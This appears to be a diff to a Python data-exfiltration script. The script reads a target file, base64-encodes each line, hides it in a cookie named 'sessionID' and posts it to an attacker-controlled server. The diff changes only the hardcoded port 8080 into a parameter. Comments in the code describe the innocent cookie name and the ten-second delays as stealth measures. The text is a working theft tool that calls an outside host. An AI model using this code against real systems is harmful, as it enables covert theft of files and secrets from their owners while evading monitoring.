@@ -18,13 +18,13 @@ def process_file(target_file):
 	return line_list
 
 # Specify the target domain which the attacker controls for exfil
-def exfil_cookie(data, target_domain):
+def exfil_cookie(data, target_domain, port):
 	# Access the cookie jar in which the data will be stored
 	jar = requests.cookies.RequestsCookieJar()
 	# Give the cookie an innocent name because stealth.
 	jar.set('sessionID', data, domain=target_domain, path='/')
 	# Request goes to attacker http server
-	req = requests.post('http://%s:8080/' % target_domain, cookies=jar)
+	req = requests.post('http://{0}:{1}/'.format(target_domain, port), cookies=jar)
 
 	# Each cookie which gets added is printed 
 	for cookie in jar:
@@ -60,7 +60,7 @@ def main():
 		# Get the for loop and then stick
 		for line in target_file:
 			base64_line = encode_data(line)
-			exfil_cookie(base64_line, sys.argv[1])
+			exfil_cookie(base64_line, sys.argv[1], 8080)
 			# Time between each cookie request made for stealth and performance purposes
 			time.sleep(10)
 	except Exception as e:
